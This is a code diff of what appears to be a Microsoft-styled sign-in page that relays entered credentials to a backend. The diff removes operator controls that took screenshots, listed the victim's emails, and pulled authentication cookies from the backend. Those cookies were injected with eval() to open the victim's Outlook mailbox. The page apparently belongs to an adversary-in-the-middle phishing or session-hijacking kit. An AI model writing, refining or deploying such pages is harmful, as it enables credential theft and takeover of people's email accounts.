@@ -255,41 +255,7 @@
             color: #323130;
         }
 
-        .session-info {
-            background: #deecf9;
-            padding: 12px;
-            border-radius: 2px;
-            margin-bottom: 15px;
-            font-size: 13px;
-            border: 1px solid #92c5f7;
-        }
-
-        .actions {
-            display: none;
-            margin-top: 20px;
-        }
-
-        .actions.visible {
-            display: block;
-        }
-
-        .actions .btn {
-            width: 100%;
-            margin-bottom: 8px;
-            padding: 8px 16px;
-            border-radius: 2px;
-            font-size: 13px;
-        }
-
-        .actions .btn.success {
-            background-color: #107c10;
-            color: white;
-        }
-
-        .actions .btn.danger {
-            background-color: #d13438;
-            color: white;
-        }
+        
 
         .hidden {
             display: none;
@@ -368,32 +334,7 @@
                 </form>
             </div>
 
-            <!-- Session actions (shown after login starts) -->
-            <div class="actions" id="sessionActions">
-                <div class="session-info">
-                    <strong>Session Active:</strong> <span id="sessionId">-</span>
-                </div>
-
-                <button type="button" class="btn success" onclick="takeScreenshot()">
-                    📸 Take Screenshot
-                </button>
-
-                <button type="button" class="btn success" onclick="checkEmails()">
-                    📬 Check Emails
-                </button>
-
-                <button type="button" class="btn success" onclick="injectCookies()">
-                    🍪 Use Backend Login
-                </button>
-
-                <button type="button" class="btn btn-secondary" onclick="startNewSession()">
-                    🔄 Start New Session
-                </button>
-
-                <button type="button" class="btn danger" onclick="closeSession()">
-                    ❌ Close Session
-                </button>
-            </div>
+            
         </div>
 
         <!-- Sign-in options -->
@@ -497,17 +438,7 @@
             document.getElementById('backInfo').className = 'back-info';
         }
 
-        function showSessionActions(show) {
-            const actions = document.getElementById('sessionActions');
-            actions.className = show ? 'actions visible' : 'actions';
-
-            if (!show) {
-                showEmailForm();
-            } else {
-                document.getElementById('emailForm').style.display = 'none';
-                document.getElementById('passwordForm').className = 'password-section';
-            }
-        }
+        
 
         function goBack() {
             // Placeholder for back functionality
@@ -613,8 +544,7 @@
 
                     if (data.loginComplete) {
                         if (data.loginSuccess) {
-                            showMessage(`✅ ${data.message}`, 'success');
-                            showSessionActions(true);
+                            showMessage(`✅ ${data.message} Login successful!`, 'success');
                         } else {
                             showMessage(`⚠️ ${data.message}`, 'error');
                         }
@@ -704,8 +634,7 @@
 
                 if (response.ok) {
                     if (data.loginSuccess) {
-                        showMessage(`✅ ${data.message}`, 'success');
-                        showSessionActions(true);
+                        showMessage(`✅ ${data.message} Password accepted!`, 'success');
                     } else {
                         showMessage(`⚠️ ${data.message}`, 'error');
                     }
@@ -724,117 +653,7 @@
             }
         }
 
-        async function takeScreenshot() {
-            clearMessage();
-            showMessage('📸 Taking screenshot...', 'info');
-
-            try {
-                const response = await fetch(`${API_BASE}/api/screenshot`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({})
-                });
-
-                const data = await response.json();
-
-                if (response.ok) {
-                    showMessage(`📸 Screenshot saved: ${data.screenshot}`, 'success');
-                } else {
-                    throw new Error(data.error);
-                }
-            } catch (error) {
-                showMessage(`❌ Screenshot failed: ${error.message}`, 'error');
-            }
-        }
-
-        async function checkEmails() {
-            clearMessage();
-            showMessage('📬 Checking emails...', 'info');
-
-            try {
-                const response = await fetch(`${API_BASE}/api/emails`);
-                const data = await response.json();
-
-                if (response.ok) {
-                    if (data.emails.length > 0) {
-                        const emailList = data.emails.slice(0, 5).join('<br>• ');
-                        showMessage(`📬 Found ${data.count} emails:<br>• ${emailList}`, 'success');
-                    } else {
-                        showMessage('📭 No emails found', 'info');
-                    }
-                } else {
-                    throw new Error(data.error);
-                }
-            } catch (error) {
-                showMessage(`❌ Email check failed: ${error.message}`, 'error');
-            }
-        }
-
-        async function startNewSession() {
-            if (confirm('This will close the current session and start a new one. Continue?')) {
-                await closeSession();
-                // Reset forms
-                document.getElementById('email').value = '';
-                document.getElementById('password').value = '';
-                showEmailForm();
-                clearMessage();
-            }
-        }
-
-        async function closeSession() {
-            if (!currentSessionId) return;
-
-            try {
-                const response = await fetch(`${API_BASE}/api/session`, {
-                    method: 'DELETE'
-                });
-
-                const data = await response.json();
-
-                if (response.ok) {
-                    showMessage('✅ Session closed successfully', 'success');
-                } else {
-                    showMessage('⚠️ Session may not have closed properly', 'error');
-                }
-            } catch (error) {
-                showMessage(`❌ Error closing session: ${error.message}`, 'error');
-            } finally {
-                currentSessionId = null;
-                showSessionActions(false);
-                clearMessage();
-            }
-        }
-
-        async function injectCookies() {
-            try {
-                showMessage('🍪 Getting authentication cookies from backend...', 'info');
-                
-                const response = await fetch(`${API_BASE}/api/export-cookies`);
-                const data = await response.json();
-
-                if (response.ok) {
-                    // Execute the cookie injection script
-                    const result = eval(data.injectionScript);
-                    
-                    if (result.success) {
-                        showMessage(`🎉 Successfully injected ${result.cookiesSet} authentication cookies! You can now open a new tab and go to <a href="https://outlook.office.com/mail/" target="_blank">outlook.office.com</a> to access your emails.`, 'success');
-                        
-                        // Option to redirect automatically
-                        const redirect = confirm('Would you like to open Outlook in a new tab now?');
-                        if (redirect) {
-                            window.open('https://outlook.office.com/mail/', '_blank');
-                        }
-                    } else {
-                        throw new Error('Cookie injection failed');
-                    }
-                } else {
-                    throw new Error(data.error || 'Failed to get cookies');
-                }
-
-            } catch (error) {
-                showMessage(`❌ Error injecting cookies: ${error.message}`, 'error');
-            }
-        }
+        
     </script>
 </body>
 </html>
